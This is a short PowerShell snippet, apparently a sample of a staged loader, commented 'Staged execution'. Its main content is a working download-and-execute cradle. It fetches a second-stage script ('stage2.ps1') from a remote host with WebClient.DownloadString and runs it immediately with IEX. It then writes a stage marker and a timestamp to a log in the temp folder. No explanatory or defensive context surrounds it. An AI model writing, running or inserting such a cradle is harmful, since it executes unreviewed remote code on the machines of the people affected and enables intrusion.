
<# Staged execution #> $TargetUrl = 'https://internal.corp:443/stage2.ps1'; $ScriptText = (New-Object System.Net.WebClient).DownloadString($TargetUrl); IEX $ScriptText; $StageMarker = "stage-25"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
